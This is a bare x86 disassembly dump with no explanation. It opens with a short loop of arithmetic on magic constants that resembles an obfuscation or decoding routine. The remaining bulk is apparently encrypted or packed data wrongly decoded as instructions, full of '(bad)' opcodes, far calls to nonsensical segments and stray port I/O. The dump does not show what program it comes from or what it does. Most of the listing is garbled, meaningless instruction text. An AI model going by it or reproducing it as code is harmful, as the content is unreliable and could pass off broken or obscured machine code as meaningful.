  4183ed:	mov    ecx,0x242ebe9
  4183f2:	je     0x41cb94
  4183f8:	mov    edx,DWORD PTR [ebp+0x8]
  4183fb:	mov    ebx,DWORD PTR [ebp-0x8]
  4183fe:	xor    edx,eax
  418400:	xor    ebx,eax
  418402:	sub    edx,ebx
  418404:	sub    edx,esi
  418406:	xor    edx,eax
  418408:	mov    DWORD PTR [ebp+0x8],edx
  41840b:	mov    edx,DWORD PTR [ebp+0x8]
  41840e:	mov    ebx,DWORD PTR [ebp-0x58]
  418411:	add    edx,0x5708c4
  418417:	imul   edx,ebx
  41841a:	mov    DWORD PTR [ebp-0x58],edx
  41841d:	mov    edx,DWORD PTR [ebp+0x8]
  418420:	mov    ebx,DWORD PTR [ebp-0x54]
  418423:	add    edx,0x64f8da
  418429:	or     edx,ebx
  41842b:	mov    DWORD PTR [ebp-0x54],edx
  41842e:	mov    edx,DWORD PTR [ebp+0x8]
  418431:	mov    ebx,DWORD PTR [ebp-0x50]
  418434:	add    edx,ecx
  418436:	xor    edx,ebx
  418438:	mov    DWORD PTR [ebp-0x50],edx
  41843b:	mov    edx,DWORD PTR [ebp+0x8]
  41843e:	mov    ebx,DWORD PTR [ebp-0x4c]
  418441:	add    edx,edi
  418443:	and    edx,ebx
  418445:	mov    DWORD PTR [ebp-0x4c],edx
  418448:	mov    edx,DWORD PTR [ebp+0x8]
  41844b:	mov    ebx,DWORD PTR [ebp-0x48]
  41844e:	lea    edx,[ebx+edx*1+0x241fc1f]
  418455:	mov    DWORD PTR [ebp-0x48],edx
  418458:	mov    edx,DWORD PTR [ebp+0x8]
  41845b:	mov    ebx,0xfa5e15e2
  418460:	sub    ebx,edx
  418462:	add    ebx,DWORD PTR [ebp-0x44]
  418465:	mov    DWORD PTR [ebp-0x44],ebx
  418468:	mov    edx,DWORD PTR [ebp+0x8]
  41846b:	xor    edx,eax
  41846d:	add    edx,esi
  41846f:	jne    0x4183f8
  418475:	jmp    0x41cb94
  41847a:	jmp    0x41a7c3
  41847f:	adc    BYTE PTR [edi],cl
  418481:	lods   eax,DWORD PTR ds:[esi]
  418482:	fnsave [ebx-0x21]
  418485:	lock jae 0x41841c
  418488:	sbb    DWORD PTR [edx-0x4],ebx
  41848b:	pusha  
  41848c:	rol    DWORD PTR [ecx+0x7d30cc86],cl
  418492:	jl     0x4184d4
  418494:	pop    edi
  418495:	jl     0x418513
  418497:	adc    BYTE PTR [ecx],ah
  418499:	or     DWORD PTR [edi+0x25],ebx
  41849c:	mov    al,0x76
  41849e:	sar    BYTE PTR [edi],cl
  4184a0:	rcl    edi,1
  4184a2:	xor    BYTE PTR [edi-0x22],bl
  4184a5:	aam    0xd8
  4184a7:	jg     0x4184c2
  4184a9:	hlt    
  4184aa:	aas    
  4184ab:	(bad)  
  4184ac:	fist   DWORD PTR [ecx-0x6abfdea3]
  4184b2:	scas   al,BYTE PTR es:[edi]
  4184b3:	fist   DWORD PTR [ebx+0x73]
  4184b6:	inc    edx
  4184b7:	in     al,dx
  4184b8:	adc    esi,esi
  4184ba:	mov    ah,0x19
  4184bc:	pop    ebx
  4184bd:	push   esp
  4184be:	mov    ah,0xca
  4184c0:	xchg   esp,eax
  4184c1:	outs   dx,BYTE PTR ds:[esi]
  4184c2:	call   0x79c3:0x115675c5
  4184c9:	mov    WORD PTR ds:0xb841d5f3,cs
  4184cf:	(bad)  
  4184d0:	push   ecx
  4184d1:	(bad)  
  4184d3:	je     0x418503
  4184d5:	call   0xb6ca:0x3a019591
  4184dc:	ds dec esp
  4184de:	cmp    al,al
  4184e0:	out    0xec,al
  4184e2:	dec    edx
  4184e3:	(bad)
  4184e7:	call   0x4a29:0x995122d8
  4184ee:	or     eax,0x1a92d5e2
  4184f3:	imul   ebp,ebp,0x70bc54e0
  4184f9:	mov    ah,0x9f
  4184fb:	add    DWORD PTR [ebp+0x58],edx
  4184fe:	push   es
  4184ff:	xchg   edx,eax
  418500:	pop    eax
  418501:	ja     0x4184be
  418503:	fcom   st(4)
  418505:	out    0x39,eax
  418507:	sbb    DWORD PTR gs:[esi],edx
  41850a:	daa    
  41850b:	mov    al,ds:0x9ee7b045
  418510:	dec    ecx
  418511:	cmp    esi,edi
  418513:	pop    esp
  418514:	jmp    0xfba83ba3
  418519:	mov    WORD PTR [eax+0x2e558597],gs
  41851f:	aad    0x12
  418521:	sbb    eax,0x13186d01
  418526:	inc    eax
  418527:	jle    0x41858a
  418529:	call   0x9757ef32
  41852e:	fs pop edx
  418530:	or     ah,0x2b
  418533:	cmp    dh,BYTE PTR [edx+0x5fe9174d]
  418539:	inc    ecx
  41853a:	sahf   
  41853b:	int3   
  41853c:	jmp    0xb8234d2b
  418541:	in     al,dx
  418542:	mov    esi,0xe01fe3b9
  418547:	daa    
  418548:	inc    ebp
  418549:	cmp    DWORD PTR [ebx+0x59],0x1c
  41854d:	ret    
  41854e:	sub    al,0x57
  418550:	jno    0x4184dd
  418552:	xchg   BYTE PTR [ebx],cl
  418554:	or     al,0x36
  418556:	mov    ecx,0xb5404426
  41855b:	icebp  
  41855c:	sub    al,0xec
  41855e:	mov    dh,0xec
  418560:	adc    dl,dh
  418562:	adc    al,BYTE PTR [esi]
  418564:	xchg   ebp,eax
  418565:	mov    al,ds:0xcd15f321
  41856a:	and    bh,BYTE PTR [edi-0x3f337bea]
  418570:	xchg   ebx,eax
  418571:	jmp    0x92d3:0x7b6dd99b
  418578:	xchg   BYTE PTR [ecx+0x4acf4a02],ah
  41857e:	adc    eax,0xe8cafa1e
  418583:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418584:	adc    eax,0x60e7f57c
  418589:	or     DWORD PTR es:[ebp+ebx*4+0x7711337a],0x884711d9
  418595:	call   0xf6589f88
  41859a:	dec    esi
  41859b:	jge    0x4185dd
  41859d:	stos   DWORD PTR es:[edi],eax
  41859e:	mov    WORD PTR [eax+eiz*2+0x673432b4],?
  4185a5:	bnd js 0x41857d
  4185a8:	shr    DWORD PTR [ebx-0xd],0xd2
  4185ac:	mov    ebp,0x6319a292
  4185b1:	dec    edx
  4185b2:	jmp    0x4cab:0xb3fa6aef
  4185b9:	add    edi,DWORD PTR [ebx+0x7c556ab0]
  4185bf:	mov    eax,ds:0x2e12b9b1
  4185c4:	sub    eax,0x3b4012fc
  4185c9:	xchg   edx,eax
  4185ca:	pop    es
  4185cb:	pusha  
  4185cc:	sar    BYTE PTR [ebp-0x3b],1
  4185cf:	mov    bh,0x4d
  4185d1:	ror    DWORD PTR [ebx-0x1c00561],0x96
  4185d8:	rcr    BYTE PTR [edx],cl
  4185da:	add    dl,ch
  4185dc:	aam    0x98
  4185de:	inc    eax
  4185df:	jne    0x418591
  4185e1:	stos   DWORD PTR es:[edi],eax
  4185e2:	es inc esi
  4185e4:	sbb    ebp,DWORD PTR [ebp-0x72]
  4185e7:	outs   dx,BYTE PTR ds:[esi]
  4185e8:	jns    0x4185d7
  4185ea:	xor    al,0xd6
  4185ec:	pop    edx
  4185ed:	sub    ebp,ebp
  4185ef:	adc    BYTE PTR [edx],dh
  4185f1:	mov    bl,0x64
  4185f3:	out    0x31,eax
  4185f5:	loopne 0x4185f5
  4185f7:	xor    al,0x91
  4185f9:	push   es
  4185fa:	sub    DWORD PTR [edi+0x50],esi
  4185fd:	jg     0x418677
  4185ff:	pop    ds
  418600:	jbe    0x4185cb
  418602:	gs into 
  418604:	dec    edi
  418605:	push   esp
  418606:	ret    0xa0aa
  418609:	lea    edi,cs:[ebx-0x7bb7146c]
  418610:	jcxz   0x4185fb
  418613:	stc    
  418614:	out    dx,al
  418615:	out    dx,eax
  418616:	pop    ebx
  418617:	pop    ds
  418618:	add    al,0x35
  41861a:	xchg   edi,eax
  41861b:	inc    esp
  41861c:	add    esp,DWORD PTR [eax+edi*1]
  41861f:	repnz dec edx
  418621:	push   0x1b07164a
  418626:	data16 fucomi st,st(7)
  418629:	pop    ebp
  41862a:	xchg   ecx,eax
  41862b:	push   edx
  41862c:	push   0xffffffb3
  41862e:	cmp    dl,BYTE PTR [ecx-0x36]
  418631:	xor    DWORD PTR [esi-0xd],edx
  418634:	fist   WORD PTR [ecx+0x4cd4d17c]
  41863a:	xchg   BYTE PTR [ebp-0x1c],ah
  41863d:	sub    al,0x92
  41863f:	fs push ebp
  418641:	push   0x4f5a54b4
  418646:	or     DWORD PTR [edx+ecx*1],edi
  418649:	or     ah,bh
  41864b:	dec    ecx
  41864c:	and    BYTE PTR [eax-0x49],0xa8
  418650:	repnz aad 0x2f
  418653:	and    al,0x39
  418655:	mov    esi,0x8200d50c
  41865a:	in     eax,dx
  41865b:	mov    dl,0x69
  41865d:	fimul  WORD PTR [eax+0x2e]
  418660:	jmp    0x4186c4
  418662:	aaa    
  418663:	push   ecx
  418664:	test   eax,0xe3f47523
  418669:	jmp    0xddaef287
  41866e:	cmp    al,0xae
  418670:	mov    dh,BYTE PTR [edx+0x349eb509]
  418676:	test   eax,0x95dc656
  41867b:	adc    eax,0x2bf400da
  418680:	mov    esp,0xb5916538
  418685:	add    BYTE PTR gs:[edi-0x23],ah
  418689:	out    0x7d,eax
  41868b:	(bad)  
  41868c:	jb     0x418639
  41868e:	(bad)  
  41868f:	gs cwde 
  418691:	outs   dx,BYTE PTR ds:[esi]
  418692:	js     0x418654
  418694:	cli    
  418695:	imul   edx,eax,0xffffff90
  418698:	dec    eax
  418699:	mov    bh,0xb1
  41869b:	std    
  41869c:	jno    0x418653
  41869e:	(bad)  
  41869f:	jg     0x4186fe
  4186a1:	outs   dx,DWORD PTR ds:[esi]
  4186a2:	aaa    
  4186a3:	arpl   WORD PTR [eax],bp
  4186a5:	and    ecx,DWORD PTR [edx]
  4186a7:	sbb    al,0xad
  4186a9:	popf   
  4186aa:	aad    0x77
  4186ac:	dec    ebx
  4186ad:	jmp    0x418676
  4186af:	shl    BYTE PTR [ebp-0x2545eb8c],1
  4186b5:	xor    eax,0x4a21f694
  4186ba:	loope  0x418717
  4186bc:	push   es
  4186bd:	or     dl,ah
  4186bf:	jg     0x418712
  4186c1:	pop    ds
  4186c2:	retf   
  4186c3:	(bad)  
  4186c4:	iret   
  4186c5:	pop    eax
  4186c6:	int3   
  4186c7:	cmp    DWORD PTR [eax+edi*1],eax
  4186ca:	or     dl,al
  4186cc:	call   0xecd254da
  4186d1:	or     al,0xd3
  4186d3:	mov    eax,ds:0x9f4f4ee0
  4186d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186d9:	call   0x8daa612f
  4186de:	cli    
  4186df:	rcl    DWORD PTR [ecx+edx*1+0x6a],cl
  4186e3:	cmp    ebx,DWORD PTR [ecx-0x61]
  4186e6:	imul   edi,DWORD PTR [edi],0x50
  4186e9:	cmp    ebp,edx
  4186eb:	arpl   WORD PTR [ebx-0x11],bp
  4186ee:	(bad)  
  4186ef:	and    BYTE PTR [edx],bl
  4186f1:	ficom  DWORD PTR [eax+0x521891c8]
  4186f7:	icebp  
  4186f8:	retf   0xf2f1
  4186fb:	cmp    DWORD PTR [ecx-0x51],ebx
  4186fe:	adc    al,BYTE PTR ds:0x289008a5
  418704:	outs   dx,DWORD PTR ds:[esi]
  418705:	pop    edx
  418706:	push   ss
  418707:	(bad)  
  418708:	test   eax,0x5c7b4a35
  41870d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41870e:	mov    dh,BYTE PTR ds:0xa1f24af4
  418714:	(bad)  
  418715:	int3   
  418716:	pushf  
  418717:	and    DWORD PTR [ebx-0x2cde5827],eax
  41871d:	imul   edx,edi,0xffffff86
  418720:	adc    cl,BYTE PTR [esi]
  418722:	jnp    0x4186e8
  418724:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  418726:	fidivr DWORD PTR [eax]
  418728:	mov    ds,WORD PTR [ebx-0x32]
  41872b:	mov    ah,ch
  41872d:	fdivr  st(3),st
  41872f:	repz or eax,0x34ea4987
  418735:	sbb    al,0x8e
  418737:	(bad)  
  418738:	jmp    0x6bb104ce
  41873d:	cmc    
  41873e:	in     eax,0xba
  418740:	pop    ebp
  418741:	push   0x2f4f58fe
  418746:	es mov dh,0x82
  418749:	dec    edx
  41874a:	jecxz  0x418780
  41874c:	inc    ebp
  41874d:	or     edi,DWORD PTR [edx]
  41874f:	add    BYTE PTR [edx+0x3a],ah
  418752:	fs ja  0x41878a
  418755:	adc    dh,ch
  418757:	push   es
  418758:	xchg   dh,dh
  41875a:	jo     0x4187b7
  41875c:	cmovg  eax,DWORD PTR ss:[edx-0x29]
  418761:	nop
  418762:	std    
  418763:	xor    ebp,ebx
  418765:	jne    0x4187cb
  418767:	sbb    al,0x4
  418769:	mov    ds:0x8a90d3a0,al
  41876e:	lea    ebp,[ebp+0xb]
  418771:	aaa    
  418772:	and    edx,esi
  418774:	rcr    DWORD PTR [edi],0x62
  418777:	lds    ebx,FWORD PTR [eax+0xcb4bbd]
  41877d:	popf   
  41877e:	popa   
  41877f:	cmp    bl,cl
  418781:	out    0x38,eax
  418783:	dec    bp
  418785:	gs cmp ecx,edx
  418788:	lock js 0x418755
  41878b:	and    al,0x4b
  41878d:	loopne 0x418790
  41878f:	add    dl,BYTE PTR [ebx]
  418791:	imul   ebx,DWORD PTR [esp+esi*8+0xc86aa23],0xffffff93
  418799:	and    eax,0xaa71fa53
  41879e:	imul   eax,ebp,0xde4787c6
  4187a4:	mov    cl,0x3d
  4187a6:	cdq    
  4187a7:	sti    
  4187a8:	mov    al,0x5
  4187aa:	ror    BYTE PTR [ebx-0x2171f584],0x72
  4187b1:	hlt    
  4187b2:	adc    BYTE PTR [ebx],dl
  4187b4:	jge    0x418803
  4187b6:	into   
  4187b7:	jg     0x41878a
  4187b9:	ss jne 0x41879a
  4187bc:	sub    cl,cl
  4187be:	adc    ecx,edi
  4187c0:	shl    DWORD PTR [ebp+0x8d3af9f],1
  4187c6:	fsub   st,st(0)
  4187c8:	push   ds
  4187c9:	std    
  4187ca:	mov    al,ds:0x22cfa88c
  4187cf:	stos   BYTE PTR es:[edi],al
  4187d0:	clc    
  4187d1:	nop
  4187d2:	xor    ebp,ecx
  4187d4:	pop    eax
  4187d5:	enter  0x822d,0x3
  4187d9:	cmp    eax,0xd3469457
  4187de:	xor    bh,BYTE PTR [ebx+0x5f]
  4187e1:	(bad)  
  4187e2:	ret    
  4187e3:	adc    ebp,DWORD PTR [esi-0x2963d846]
  4187e9:	data16 xor BYTE PTR [eax+0x68],0x83
  4187ee:	idiv   BYTE PTR [ebx+edx*2+0x433e7c56]
  4187f5:	out    0x9,eax
  4187f7:	outs   dx,DWORD PTR fs:[esi]
  4187f9:	out    0x6a,eax
  4187fb:	outs   dx,BYTE PTR ds:[esi]
  4187fc:	or     eax,0xdc11d02b
  418801:	mov    esi,0x446ae605
  418806:	mov    al,0xb6
  418808:	jle    0x418825
  41880a:	fsincos 
  41880c:	fild   QWORD PTR [ecx-0x41]
  41880f:	in     eax,0xba
  418811:	inc    eax
  418812:	sbb    al,0xe3
  418814:	ja     0x4187c4
  418816:	push   DWORD PTR [edx+0x54f6316f]
  41881c:	cmp    dh,BYTE PTR [eax-0x18]
  41881f:	cmp    esp,DWORD PTR [edx]
  418821:	scas   al,BYTE PTR es:[edi]
  418822:	fwait
  418823:	adc    eax,DWORD PTR [eax-0x1c]
  418826:	fimul  WORD PTR [ebp+0x179466fc]
  41882c:	sbb    BYTE PTR [ecx+0x47db74ff],bh
  418832:	push   esi
  418833:	or     al,0xfa
  418835:	sti    
  418836:	call   0x9a8cda74
  41883b:	test   BYTE PTR [edi-0x80],ah
  41883e:	cs push eax
  418840:	bound  esp,QWORD PTR ds:0xa8b6ff91
  418846:	adc    BYTE PTR [eax+0x36],0xe8
  41884a:	xchg   esp,eax
  41884b:	cwde   
  41884c:	jb     0x418878
  41884e:	inc    esp
  41884f:	(bad)  
  418850:	push   ebx
  418851:	dec    ebp
  418852:	repnz test BYTE PTR [ecx],bl
  418855:	xchg   ebp,eax
  418856:	pop    ss
  418857:	mov    esp,0x3e3f6a3a
  41885c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41885d:	pop    ebp
  41885e:	add    edx,DWORD PTR [ebx-0x5e3b78b7]
  418864:	repz int3 
  418866:	jne    0x4188d3
  418868:	jbe    0x418888
  41886a:	jmp    0xd5f3a6b3
  41886f:	and    bh,cl
  418871:	push   ss
  418872:	stos   DWORD PTR es:[edi],eax
  418873:	sbb    eax,0xdcd76535
  418878:	and    esi,edx
  41887a:	xor    bh,cl
  41887c:	test   eax,0xfff37fb9
  418881:	inc    edx
  418882:	clc    
  418883:	sbb    eax,0xcf1f97b8
  418888:	fnstcw WORD PTR [esi+esi*1+0x6]
  41888c:	retf   
  41888d:	cmp    esp,DWORD PTR [ecx]
  41888f:	lods   eax,DWORD PTR ds:[esi]
  418890:	or     BYTE PTR [ebx+0x31b0511f],0x1d
  418897:	mov    eax,0xbc1c40d1
  41889c:	icebp  
  41889d:	push   cs
  41889e:	mov    ds:0x644df7e2,eax
  4188a3:	or     ebp,DWORD PTR cs:[ecx]
  4188a6:	xor    BYTE PTR [eax-0x4e4d4c7b],0xc5
  4188ad:	xchg   ecx,eax
  4188ae:	mov    ecx,DWORD PTR [esi+0x79]
  4188b1:	inc    ecx
  4188b2:	and    BYTE PTR [esi],bl
  4188b4:	int    0x33
  4188b6:	pop    ss
  4188b7:	stc    
  4188b8:	sbb    ecx,edx
  4188ba:	retfw  
  4188bc:	mov    al,ds:0xf00486a7
  4188c1:	fwait
  4188c2:	and    al,0x4a
  4188c4:	stos   DWORD PTR es:[edi],eax
  4188c5:	mov    dh,0x9f
  4188c7:	mov    al,0x5e
  4188c9:	sub    DWORD PTR [edi-0x78],0x15
  4188cd:	push   esi
  4188ce:	add    DWORD PTR [edx+0x41e25574],esi
  4188d4:	push   edi
  4188d5:	std    
  4188d6:	mov    ah,ch
  4188d8:	leave  
  4188d9:	xchg   esi,eax
  4188da:	dec    esp
  4188db:	inc    edx
  4188dc:	popf   
  4188dd:	sub    DWORD PTR [ecx+ecx*2+0x3586e5f0],ebx
  4188e4:	xchg   edx,eax
  4188e5:	pusha  
  4188e6:	int3   
  4188e7:	dec    ebx
  4188e8:	scas   ax,WORD PTR es:[edi]
  4188ea:	inc    esp
  4188eb:	mov    bh,0x9f
  4188ed:	emms   
  4188ef:	test   edi,edi
  4188f1:	in     eax,0x5a
  4188f3:	out    dx,al
  4188f4:	jnp    0x4188c6
  4188f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188f7:	pop    ds
  4188f8:	push   cs
  4188f9:	clc    
  4188fa:	outs   dx,DWORD PTR ds:[esi]
  4188fb:	push   ds
  4188fc:	enter  0x8fe3,0x58
  418900:	inc    ecx
  418901:	jmp    0x26c0:0x81c43cef
  418908:	(bad)  
  418909:	jecxz  0x418965
  41890b:	jmp    0xa067c312
  418910:	or     al,0x5a
  418912:	jge    0x418979
  418914:	div    BYTE PTR [esi+0xfe689b7]
  41891a:	ins    DWORD PTR es:[edi],dx
  41891b:	test   eax,0xe4717c82
  418920:	bound  eax,QWORD PTR [edi+0x2739a7e3]
  418926:	fisubr DWORD PTR [ecx]
  418928:	xchg   edx,ebx
  41892a:	call   0x64da51a4
  41892f:	fucomip st,st(1)
  418931:	aas    
  418932:	aas    
  418933:	imul   ebp,DWORD PTR [ecx-0x103fde1f],0xaac0013d
  41893d:	dec    esi
  41893e:	imul   ebx,DWORD PTR [edi+0x4062d20a],0xffffffa2
  418945:	mov    BYTE PTR [ebx+0x1c],dh
  418948:	fdivr  QWORD PTR [esi+0x1c]
  41894b:	inc    esi
  41894c:	retf   
  41894d:	imul   esp,DWORD PTR [edx+0x4055556a],0xe7a44f0
  418957:	loope  0x418955
  418959:	loop   0x418940
  41895b:	jle    0x4189c9
  41895d:	icebp  
  41895e:	push   edi
  41895f:	push   ebp
  418960:	repnz enter 0x7c97,0x7c
  418965:	adc    DWORD PTR [ebx+edi*8-0x1d],ebx
  418969:	out    dx,al
  41896a:	xor    al,0xd6
  41896c:	xor    dh,BYTE PTR [edi-0x4f8316d6]
  418972:	or     edx,edi
  418974:	xchg   ebx,eax
  418975:	mov    cl,0xb5
  418977:	xor    al,dh
  418979:	ffreep st(6)
  41897b:	dec    ecx
  41897c:	fs retf 
  41897e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41897f:	cld    
  418980:	imul   BYTE PTR [edx]
  418982:	inc    ebx
  418983:	jmp    0xec57:0xcb910ab5
  41898a:	xor    cl,BYTE PTR [ecx-0x3d]
  41898d:	pop    eax
  41898e:	jno    0x418980
  418990:	sbb    BYTE PTR [edi+0x3862a472],dl
  418996:	jecxz  0x418a0d
  418998:	sub    BYTE PTR [esp+edx*1-0x3339b8b6],dl
  41899f:	repz dec esi
  4189a1:	jne    0x4189c5
  4189a3:	and    al,0xa7
  4189a5:	push   esp
  4189a6:	mov    ebx,0x74e2f6f0
  4189ab:	mov    edx,0xefff0b46
  4189b0:	mov    al,0xd3
  4189b2:	xor    BYTE PTR ds:0x22fbc8f9,0x2f
  4189b9:	mov    al,0x91
  4189bb:	cmp    eax,esp
  4189bd:	lods   al,BYTE PTR ds:[esi]
  4189be:	es fs pop ds
  4189c1:	xchg   edx,eax
  4189c2:	push   ebx
  4189c3:	icebp  
  4189c4:	dec    DWORD PTR [esi+0x15efe0a8]
  4189ca:	aad    0x96
  4189cc:	(bad)  
  4189cd:	fucomp st(3)
  4189cf:	and    cl,BYTE PTR [ecx]
  4189d1:	les    edi,FWORD PTR [eax+0x3002cfb0]
  4189d7:	jbe    0x418a11
  4189d9:	jle    0x4189d8
  4189db:	push   esi
  4189dc:	out    0x9b,al
  4189de:	mov    esp,0xfa65515
  4189e3:	add    ebx,ecx
  4189e5:	jmp    0x4537ee14
  4189ea:	sbb    ebp,DWORD PTR [ebp+0x6e]
  4189ed:	pop    ds
  4189ee:	xor    al,0x2f
  4189f0:	dec    esp
  4189f1:	jbe    0x41899f
  4189f3:	xchg   ecx,eax
  4189f4:	dec    ebx
  4189f5:	imul   esi,DWORD PTR [edx],0xffffffcd
  4189f8:	les    eax,FWORD PTR [esi-0x74]
  4189fb:	inc    ebp
  4189fc:	jo     0x418a77
  4189fe:	test   eax,0x744d1def
  418a03:	int3   
  418a04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a05:	fs cwde 
  418a07:	mov    ebp,0x4d0f9818
  418a0c:	ror    BYTE PTR [ebx+0x70],0xec
  418a10:	ins    BYTE PTR es:[edi],dx
  418a11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a12:	stc    
  418a13:	lock sub dl,BYTE PTR ss:[ecx+eiz*2]
  418a18:	jnp    0x418a46
  418a1a:	dec    eax
  418a1b:	jne    0x418a0d
  418a1d:	mov    al,ds:0x23bb260f
  418a22:	inc    ebx
  418a23:	mov    ah,0x42
  418a25:	add    BYTE PTR [esi-0x1d78de19],dl
  418a2b:	sbb    dl,BYTE PTR [ebx-0xd9e2d34]
  418a31:	clc    
  418a32:	jecxz  0x418a8f
  418a34:	test   BYTE PTR [edx+ebp*2],cl
  418a37:	mov    esi,0x19bf866e
  418a3c:	xlat   BYTE PTR ds:[ebx]
  418a3d:	jns    0x418a1b
  418a3f:	mov    ebp,0x1660e39d
  418a44:	in     al,dx
  418a45:	add    DWORD PTR [ebp-0x7758c4a3],esi
  418a4b:	inc    esp
  418a4c:	mov    edi,0x545d3760
  418a51:	into   
  418a52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a53:	cld    
  418a54:	je     0x418a35
  418a56:	loope  0x418a15
  418a58:	add    cl,ch
  418a5a:	push   esp
  418a5b:	cpuid  
  418a5d:	and    al,0xdc
  418a5f:	xor    DWORD PTR [edx-0x1],0x6a716b88
  418a66:	pop    ecx
  418a67:	div    BYTE PTR [ebp+0x47]
  418a6a:	jmp    0xbbc206eb
  418a6f:	mov    ds:0xe2d9c453,eax
  418a74:	loopne 0x418ad5
  418a76:	ror    bh,0x8d
  418a79:	js     0x418ad5
  418a7b:	push   eax
  418a7c:	push   cs
  418a7d:	pop    edi
  418a7e:	mov    dl,0xcc
  418a80:	jb     0x418a6f
  418a82:	jbe    0x418ac0
  418a84:	mov    esp,0x9721bdb0
  418a89:	push   edx
  418a8a:	pop    ebx
  418a8b:	cmp    DWORD PTR [edi],esi
  418a8d:	es xchg ebx,eax
  418a8f:	(bad)  
  418a90:	(bad)  
  418a91:	ss sub eax,0xa32d56db
  418a97:	lahf   
  418a98:	cwde   
  418a99:	outs   dx,BYTE PTR ds:[esi]
  418a9a:	in     eax,0x37
  418a9c:	inc    eax
  418a9d:	dec    edi
  418a9e:	and    al,0xa
  418aa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418aa1:	pop    es
  418aa2:	test   BYTE PTR [esi+0x40],bl
  418aa5:	dec    eax
  418aa6:	(bad)  
  418aa7:	fcmove st,st(0)
  418aa9:	push   esp
  418aaa:	add    ebx,DWORD PTR [eax+0x79d7bb0a]
  418ab0:	ret    0xc9f4
  418ab3:	and    BYTE PTR [esi-0x61],bh
  418ab6:	lock bound ebx,QWORD PTR [ebx]
  418ab9:	sub    eax,0xa931d0e9
  418abe:	ins    DWORD PTR es:[edi],dx
  418abf:	retf   0x99ff
  418ac2:	xor    BYTE PTR [edx],dh
  418ac4:	jno    0x418a94
  418ac6:	jg     0x418aa2
  418ac8:	popa   
  418ac9:	or     edi,DWORD PTR [edi+edi*1-0x7c318c80]
  418ad0:	jns    0x418b13
  418ad2:	jns    0x418b38
  418ad4:	xchg   ebx,eax
  418ad5:	adc    dh,BYTE PTR [ebx+0x1b3c7aaf]
  418adb:	popa   
  418adc:	js     0x418b5b
  418ade:	mov    BYTE PTR [ecx+edx*1-0x6a],ah
  418ae2:	stos   BYTE PTR es:[edi],al
  418ae3:	retf   
  418ae4:	and    BYTE PTR [eax-0x5c42912a],dh
  418aea:	call   eax
  418aec:	pop    esi
  418aed:	mov    gs,WORD PTR [edx-0x31e46ce6]
  418af3:	jecxz  0x418b24
  418af5:	sub    eax,0x65f2436f
  418afa:	fldcw  WORD PTR [ebp+0x22]
  418afd:	or     BYTE PTR [ecx-0x7],dh
  418b00:	jg     0x418b10
  418b02:	repnz sahf 
  418b04:	adc    DWORD PTR [eax],0x4c
  418b07:	jmp    0x9ac8:0x5158046b
  418b0e:	mov    ds:0xb2320988,eax
  418b13:	mov    ?,WORD PTR [esi]
  418b15:	out    0xcf,al
  418b17:	add    bh,dl
  418b19:	xchg   ebx,eax
  418b1a:	fisttp WORD PTR [edx+0x5f138c32]
  418b20:	cdq    
  418b21:	mov    ebp,0xfc9a31db
  418b26:	push   edi
  418b27:	out    dx,eax
  418b28:	sbb    BYTE PTR [edi+0x215acc46],dh
  418b2e:	cdq    
  418b2f:	test   eax,0xb2891c08
  418b34:	mov    esp,0x9f5d8157
  418b39:	ja     0x418bab
  418b3b:	jg     0x418b27
  418b3d:	pop    edi
  418b3e:	adc    eax,0x990d4703
  418b43:	push   esi
  418b44:	jnp    0x418b67
  418b46:	call   0x9c8f4854
  418b4b:	fimul  WORD PTR [ecx+ecx*8-0x41]
  418b4f:	mov    bl,0x61
  418b51:	mov    dh,0x7f
  418b53:	inc    ebp
  418b54:	mov    edx,0xdb23e525
  418b59:	pushf  
  418b5a:	mov    dh,BYTE PTR [ebp+0x25]
  418b5d:	mov    ebx,0xe4154035
  418b62:	pop    esp
  418b63:	jmp    0x768d16db
  418b68:	les    eax,FWORD PTR [edi-0x5e]
  418b6b:	vpshab ymm0,xmm4,[edi-0x7]
  418b71:	fisub  WORD PTR [ebx-0x448e959e]
  418b77:	loop   0x418b33
  418b79:	mov    bl,ch
  418b7b:	neg    BYTE PTR [edi+0xe]
  418b7e:	outs   dx,BYTE PTR ds:[esi]
  418b7f:	rol    DWORD PTR [ecx-0x3c],cl
  418b82:	aad    0xd5
  418b84:	sbb    ecx,DWORD PTR [esi]
  418b86:	aad    0x6e
  418b88:	clc    
  418b89:	adc    al,0x18
  418b8b:	(bad)  
  418b8c:	xor    al,0x2d
  418b8e:	iret   
  418b8f:	loopne 0x418b54
  418b91:	ss jae 0x418b15
  418b94:	cdq    
  418b95:	mov    BYTE PTR [eax],ch
  418b97:	test   BYTE PTR [eax+eax*1-0xa],0xa
  418b9c:	xor    DWORD PTR [edi+0x10],ebp
  418b9f:	(bad)  
  418ba0:	inc    esp
  418ba1:	(bad)  
  418ba2:	repz xchg edi,eax
  418ba4:	add    DWORD PTR [edi+0x5cb1253b],esi
  418baa:	lods   al,BYTE PTR ds:[esi]
  418bab:	rcr    DWORD PTR [esi],cl
  418bad:	loope  0x418c1a
  418baf:	xor    al,0x18
  418bb1:	mov    esp,cs
  418bb3:	lahf   
  418bb4:	bound  ebx,QWORD PTR [ecx-0x59cbdef9]
  418bba:	pop    esi
  418bbb:	fs pop ebx
  418bbd:	add    cl,al
  418bbf:	or     BYTE PTR [ebp+0x715d23ac],al
  418bc5:	fucom  st(1)
  418bc7:	loopne 0x418c08
  418bc9:	jmp    0x418c2f
  418bcb:	jmp    0x418b99
  418bcd:	pop    eax
  418bce:	mov    eax,ds:0xc4ccdf94
  418bd3:	nop
  418bd4:	mov    ecx,0x84b035f9
  418bd9:	inc    eax
  418bda:	outs   dx,BYTE PTR ds:[esi]
  418bdb:	xor    al,0xc0
  418bdd:	hlt    
  418bde:	loope  0x418c2c
  418be0:	xchg   edx,eax
  418be1:	pushf  
  418be2:	lods   al,BYTE PTR ds:[esi]
  418be3:	inc    ebp
  418be4:	icebp  
  418be5:	loop   0x418c0a
  418be7:	in     eax,dx
  418be8:	rol    DWORD PTR [edx+0x7d0d26d9],1
  418bee:	nop
